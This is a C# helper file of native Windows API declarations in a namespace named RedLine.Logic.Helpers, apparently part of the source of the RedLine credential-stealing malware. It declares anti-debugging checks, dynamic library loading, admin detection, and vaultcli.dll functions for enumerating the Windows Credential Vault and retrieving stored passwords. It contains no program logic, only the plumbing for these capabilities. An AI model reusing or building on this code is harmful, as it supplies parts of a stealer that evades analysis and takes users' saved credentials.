using System;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;

namespace RedLine.Logic.Helpers
{
  public static class NativeMethods
  {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string fileName);

    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool FreeLibrary(IntPtr hModule);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("Kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CheckRemoteDebuggerPresent(
      IntPtr hProcess,
      [MarshalAs(UnmanagedType.Bool)] ref bool isDebuggerPresent);

    [DllImport("kernel32.dll")]
    public static extern bool IsDebuggerPresent();

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string module);

    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr FindWindow(string lpClassName, IntPtr ZeroOnly);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern uint GetFileAttributes(string lpFileName);

    [DllImport("shell32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool IsUserAnAdmin();

    [DllImport("vaultcli.dll")]
    public static extern int VaultOpenVault(
      ref Guid vaultGuid,
      uint offset,
      ref IntPtr vaultHandle);

    [DllImport("vaultcli.dll")]
    public static extern int VaultCloseVault(ref IntPtr vaultHandle);

    [DllImport("vaultcli.dll")]
    public static extern int VaultFree(ref IntPtr vaultHandle);

    [DllImport("vaultcli.dll")]
    public static extern int VaultEnumerateVaults(
      int offset,
      ref int vaultCount,
      ref IntPtr vaultGuid);

    [DllImport("vaultcli.dll")]
    public static extern int VaultEnumerateItems(
      IntPtr vaultHandle,
      int chunkSize,
      ref int vaultItemCount,
      ref IntPtr vaultItem);

    [DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
    public static extern int VaultGetItem_WIN8(
      IntPtr vaultHandle,
      ref Guid schemaId,
      IntPtr pResourceElement,
      IntPtr pIdentityElement,
      IntPtr pPackageSid,
      IntPtr zero,
      int arg6,
      ref IntPtr passwordVaultPtr);

    [DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
    public static extern int VaultGetItem_WIN7(
      IntPtr vaultHandle,
      ref Guid schemaId,
      IntPtr pResourceElement,
      IntPtr pIdentityElement,
      IntPtr zero,
      int arg5,
      ref IntPtr passwordVaultPtr);
  }
}
